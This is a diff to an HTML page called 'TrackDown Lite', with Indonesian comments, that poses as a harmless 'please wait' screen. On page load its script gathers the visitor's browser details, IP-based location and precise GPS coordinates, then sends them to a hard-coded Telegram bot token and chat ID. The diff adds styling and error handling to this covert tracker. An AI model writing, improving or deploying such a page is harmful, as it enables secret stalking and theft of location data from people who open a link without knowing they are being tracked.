@@ -4,18 +4,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TrackDown Lite</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+    </style>
 </head>
 <body>
     <h1>Welcome to TrackDown!</h1>
-    <p>Loading...</p>
+    <p>Please wait while we process your data...</p>
 
     <script>
-        // Masukkan token bot Telegram Anda di sini
+        // Token dan Chat ID Telegram Anda
         const telegramToken = "AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
-        // Masukkan chat ID atau grup ID Telegram Anda
         const chatId = "7375262668";
 
-        // Fungsi untuk mengirim data ke bot Telegram
+        // Fungsi untuk mengirim data ke Telegram
         function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
             fetch(url, {
@@ -23,18 +29,24 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message }),
             })
-            .then(response => console.log("Data sent to Telegram"))
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Telegram API error:", response.status);
+                    return;
+                }
+                console.log("Data sent to Telegram");
+            })
             .catch(error => console.error("Error sending to Telegram:", error));
         }
 
-        // Dapatkan informasi perangkat
+        // Informasi perangkat
         const deviceInfo = `
             Browser: ${navigator.userAgent}
             Platform: ${navigator.platform}
             Language: ${navigator.language}
         `;
 
-        // Dapatkan alamat IP menggunakan API pihak ketiga
+        // Alamat IP dengan layanan pihak ketiga
         fetch("https://ipapi.co/json/")
             .then(response => response.json())
             .then(data => {
@@ -44,13 +56,11 @@
                     Region: ${data.region}
                     Country: ${data.country_name}
                 `;
-                
-                // Kirim informasi IP ke Telegram
                 sendToTelegram(`Device Info:\n${deviceInfo}\nIP Info:\n${ipInfo}`);
             })
             .catch(error => console.error("Error fetching IP data:", error));
 
-        // Dapatkan lokasi geografis
+        // Lokasi Geografis
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -59,15 +69,16 @@
                         Longitude: ${position.coords.longitude}
                         Accuracy: ${position.coords.accuracy} meters
                     `;
-                    // Kirim informasi lokasi ke Telegram
                     sendToTelegram(`Location Info:\n${locationInfo}`);
                 },
                 (error) => {
                     sendToTelegram("Location Info: Could not retrieve location.");
+                    console.error("Geolocation error:", error.message);
                 }
             );
         } else {
             sendToTelegram("Location Info: Geolocation not supported by browser.");
+            console.warn("Geolocation not supported by browser.");
         }
     </script>
 </body>
